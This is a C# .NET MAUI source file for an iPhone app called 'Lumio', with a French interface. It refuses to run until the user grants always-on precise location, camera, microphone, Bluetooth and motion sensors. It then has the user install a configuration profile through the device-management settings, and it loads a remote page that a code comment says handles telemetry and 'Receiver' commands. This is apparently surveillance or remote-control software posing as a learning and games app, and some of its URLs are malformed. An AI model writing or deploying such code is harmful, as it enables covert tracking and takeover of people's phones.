using System;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.Maui.ApplicationModel;
using Microsoft.Maui.Controls;
using Microsoft.Maui.Graphics;
using Microsoft.Maui.Networking;
using Microsoft.Maui.Storage;

#if IOS
using CoreLocation;
using UserNotifications;
#endif

namespace LumioApp;

public partial class App : Application
{
    public App()
    {
        MainPage = new NavigationPage(new LumioMainPage())
        {
            BarBackgroundColor = Color.FromArgb("#06080d"),
            BarTextColor = Colors.White
        };
    }
}

public class LumioMainPage : ContentPage
{
    private const string WebsiteUrl = "https://github.io";
    private const string ProfileDownloadUrl = "https://github.iolumio-lab.mobileconfig";
    private const string ApiEntryUrl = "https://github.ioapi/app.html";

    private readonly VerticalStackLayout _contentArea;
    private readonly Label _statusBadge;

    private bool _profileVerifiedOnce
    {
        get => Preferences.Default.Get("LumioProfileVerified", false);
        set => Preferences.Default.Set("LumioProfileVerified", value);
    }

    public LumioMainPage()
    {
        Title = "LUMIO";
        BackgroundColor = Color.FromArgb("#06080d");

        _statusBadge = new Label
        {
            Text = "● VÉRIFICATION DU SYSTÈME...",
            TextColor = Color.FromArgb("#22d3ee"),
            FontSize = 12,
            FontAttributes = FontAttributes.Bold,
            HorizontalOptions = LayoutOptions.Center
        };

        _contentArea = new VerticalStackLayout { Spacing = 14, Padding = new Thickness(18) };

        var footerLink = new Label
        {
            Text = "Visiter le site officiel (Nexora Interactive Technologies)",
            TextColor = Color.FromArgb("#818cf8"),
            FontSize = 12,
            TextDecorations = TextDecorations.Underline,
            HorizontalOptions = LayoutOptions.Center
        };
        var tap = new TapGestureRecognizer();
        tap.Tapped += async (s, e) => await Launcher.Default.OpenAsync(new Uri(WebsiteUrl));
        footerLink.GestureRecognizers.Add(tap);

        var copyrightLabel = new Label
        {
            Text = "Copyright © 2026 Nexora Interactive Technologies, Lumio.\nLumio appartient à Nexora Interactive Technologies. Tous droits réservés, aucune partie de ce site Web, de cette application et/ou d'autres éléments de Nexora Interactive Technologies ne peut être copiée de quelque manière que ce soit.",
            TextColor = Color.FromArgb("#64748b"),
            FontSize = 10,
            HorizontalTextAlignment = TextAlignment.Center
        };

        Content = new ScrollView
        {
            Content = new VerticalStackLayout
            {
                Spacing = 16,
                Padding = new Thickness(0, 15, 0, 30),
                Children =
                {
                    new Label { Text = "LUMIO", FontSize = 34, FontAttributes = FontAttributes.Bold, TextColor = Colors.White, HorizontalOptions = LayoutOptions.Center },
                    _statusBadge,
                    _contentArea,
                    new BoxView { HeightRequest = 1, Color = Color.FromArgb("#1e293b"), Margin = new Thickness(20, 8) },
                    footerLink,
                    copyrightLabel
                }
            }
        };
    }

    protected override async void OnAppearing()
    {
        base.OnAppearing();
        await RunStartupVerificationAsync();
    }
    private async Task RunStartupVerificationAsync()
    {
        _contentArea.Children.Clear();
        _statusBadge.Text = "● DIAGNOSTIC EN COURS...";
        _statusBadge.TextColor = Color.FromArgb("#22d3ee");

        // 1. VÉRIFICATION WI-FI
        bool isWifi = Connectivity.Current.NetworkAccess == NetworkAccess.Internet &&
                      Connectivity.Current.ConnectionProfiles.Contains(ConnectionProfile.WiFi);
        if (!isWifi)
        {
            ShowError("404", "Connexion Wi-Fi", "404 Not connected to the internet.\nVous n'êtes connecté à aucun Wi-Fi. Veuillez vous connecter pour continuer.");
            return;
        }

        // 2. NOTIFICATIONS
        bool notifOk = false;
#if IOS
        var (granted, _) = await UNUserNotificationCenter.Current.RequestAuthorizationAsync(
            UNAuthorizationOptions.Alert | UNAuthorizationOptions.Sound | UNAuthorizationOptions.Badge);
        notifOk = granted;
#else
        notifOk = true;
#endif
        if (!notifOk)
        {
            ShowError("ERR-100", "Notifications", "1. Ouvrez Réglages > Lumio.\n2. Appuyez sur Notifications et activez 'Autoriser les notifications'.\n3. Appuyez sur Revérifier.");
            return;
        }

        // 3. POSITION TOUJOURS + EXACTE
        if (await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>() != PermissionStatus.Granted)
            await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
        var locAlways = await Permissions.CheckStatusAsync<Permissions.LocationAlways>();
        if (locAlways != PermissionStatus.Granted)
            locAlways = await Permissions.RequestAsync<Permissions.LocationAlways>();

        bool isPrecise = true;
#if IOS
        isPrecise = new CLLocationManager().AccuracyAuthorization == CLAccuracyAuthorization.FullAccuracy;
#endif
        if (locAlways != PermissionStatus.Granted || !isPrecise)
        {
            ShowError("ERR-101", "Position Toujours et Exacte", "1. Ouvrez Réglages > Lumio > Position.\n2. Choisissez 'Toujours' et activez 'Position exacte'.\n3. Appuyez sur Revérifier.");
            return;
        }

        // 4. CAMÉRA, MICROPHONE, BLUETOOTH, CAPTEURS
        if (await RequestOrFail<Permissions.Camera>("ERR-102", "Caméra", "Activez Appareil photo dans Réglages > Lumio.")) return;
        if (await RequestOrFail<Permissions.Microphone>("ERR-103", "Microphone", "Activez Micro dans Réglages > Lumio.")) return;
        if (await RequestOrFail<Permissions.Bluetooth>("ERR-104", "Bluetooth", "Activez Bluetooth dans Réglages > Lumio.")) return;
        if (await RequestOrFail<Permissions.Sensors>("ERR-105", "Capteurs Mouvements", "Activez Mouvements et forme dans Réglages > Confidentialité.")) return;

        // 5. PROFIL DE CONFIGURATION (Demande une fois, puis vérifie silencieusement)
        if (!_profileVerifiedOnce)
        {
            ShowProfileScreen();
            return;
        }
        else
        {
            bool profileStillValid = await VerifyProfileSilentlyAsync();
            if (!profileStillValid)
            {
                _profileVerifiedOnce = false;
                ShowError(
                    "ERR-106",
                    "Profil de configuration Lumio",
                    "1. Appuyez sur Revérifier pour retélécharger le profil Lumio.\n2. Ouvrez Réglages > Général > VPN et gestion de l'appareil.\n3. Installez le 'Profil Officiel Lumio' puis revenez dans l'application."
                );
                return;
            }
        }

        // 6. TOUT EST VÉRIFIÉ -> APPELLE L'API QUI CONTIENT TOUTE L'APPLICATION ET LES COMMANDES
        await LaunchApiAsync();
    }

    private async Task<bool> RequestOrFail<TPerm>(string code, string name, string step) where TPerm : Permissions.BasePermission, new()
    {
        var status = await Permissions.CheckStatusAsync<TPerm>();
        if (status != PermissionStatus.Granted)
            status = await Permissions.RequestAsync<TPerm>();

        if (status != PermissionStatus.Granted)
        {
            ShowError(code, name, $"1. Ouvrez Réglages sur votre iPhone.\n2. {step}\n3. Revenez dans Lumio et appuyez sur Revérifier.");
            return true;
        }
        return false;
    }

    private async Task LaunchApiAsync()
    {
        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
            var res = await client.GetAsync(ApiEntryUrl);
            if (!res.IsSuccessStatusCode)
            {
                ShowError("ERR-404-API", "API Lumio", "Le serveur API n'est pas encore en ligne. Configurez l'API puis appuyez sur Revérifier.");
                return;
            }

            _statusBadge.Text = "● CONNECTÉ À L'API LUMIO";
            _statusBadge.TextColor = Color.FromArgb("#10b981");

            // L'API gère tout (cours, jeux, télémétrie et commandes du Récepteur)
            _contentArea.Children.Add(new WebView
            {
                Source = ApiEntryUrl,
                HeightRequest = 580,
                BackgroundColor = Color.FromArgb("#06080d")
            });
        }
        catch
        {
            ShowError("ERR-404-API", "API Lumio", "Impossible de joindre l'API distante. Vérifiez l'API puis appuyez sur Revérifier.");
        }
    }

    private void ShowProfileScreen()
    {
        _statusBadge.Text = "⚠ PROFIL DE CONFIGURATION REQUIS";
        _statusBadge.TextColor = Color.FromArgb("#f59e0b");

        _contentArea.Children.Add(new Frame
        {
            BackgroundColor = Color.FromArgb("#0d111a"),
            BorderColor = Color.FromArgb("#6366f1"),
            CornerRadius = 14,
            Padding = 20,
            Content = new VerticalStackLayout
            {
                Spacing = 12,
                Children =
                {
                    new Label { Text = "Installation du Profil Lumio", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
                    new Label { Text = "Télécharge le profil puis installe-le dans Réglages > Général > VPN et gestion de l'appareil.", TextColor = Color.FromArgb("#94a3b8"), FontSize = 14 },
                    new Button
                    {
                        Text = "1. Télécharger le profil",
                        BackgroundColor = Color.FromArgb("#6366f1"),
                        TextColor = Colors.White,
                        Command = new Command(async () => await Launcher.Default.OpenAsync(new Uri(ProfileDownloadUrl)))
                    },
                    new Button
                    {
                        Text = "2. J'ai installé le profil — Continuer",
                        BackgroundColor = Color.FromArgb("#10b981"),
                        TextColor = Colors.White,
                        Command = new Command(async () => { _profileVerifiedOnce = true; await RunStartupVerificationAsync(); })
                    }
                }
            }
        });
    }

    private async Task<bool> VerifyProfileSilentlyAsync()
    {
        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var response = await client.GetAsync(ProfileDownloadUrl);
            return response.IsSuccessStatusCode && Preferences.Default.ContainsKey("LumioProfileVerified");
        }
        catch
        {
            return false;
        }
    }

    private void ShowError(string code, string missingName, string tutorial)
    {
        _statusBadge.Text = $"✕ {code} — ERREUR";
        _statusBadge.TextColor = Color.FromArgb("#ef4444");

        string body = code == "404"
            ? tutorial
            : $"[{code}] Fichiers ou autorisation manquants !\n\n{missingName} est manquant(e) !\n\nTutoriel :\n{tutorial}";

        _contentArea.Children.Add(new Frame
        {
            BackgroundColor = Color.FromArgb("#0d111a"),
            BorderColor = Color.FromArgb("#ef4444"),
            CornerRadius = 14,
            Padding = 20,
            Content = new VerticalStackLayout
            {
                Spacing = 12,
                Children =
                {
                    new Label { Text = $"{code} — {missingName}", FontSize = 18, FontAttributes = FontAttributes.Bold, TextColor = Colors.White },
                    new Label { Text = body, FontSize = 14, TextColor = Color.FromArgb("#cbd5e1") },
                    new Button
                    {
                        Text = "Revérifier",
                        BackgroundColor = Color.FromArgb("#6366f1"),
                        TextColor = Colors.White,
                        Command = new Command(async () => await RunStartupVerificationAsync())
                    }
                }
            }
        });
    }
}
